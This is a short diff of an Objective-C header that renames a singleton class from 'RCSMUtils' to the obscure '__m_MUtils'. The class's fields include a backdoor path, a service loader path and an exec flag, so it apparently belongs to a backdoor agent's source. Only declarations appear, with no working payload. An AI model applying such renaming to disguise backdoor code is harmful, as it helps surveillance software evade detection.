@@ -15,7 +15,7 @@
 //
 // This class is a singleton
 //
-@interface RCSMUtils : NSObject
+@interface __m_MUtils : NSObject
 {
 @private
   NSString *mBackdoorPath;
@@ -33,7 +33,7 @@
 @property (readwrite, retain) NSString *mServiceLoaderPath;
 @property (readwrite, retain) NSString *mExecFlag;
 
-+ (RCSMUtils *)sharedInstance;
++ (__m_MUtils *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
 
 - (id)copyWithZone:  (NSZone *)aZone;
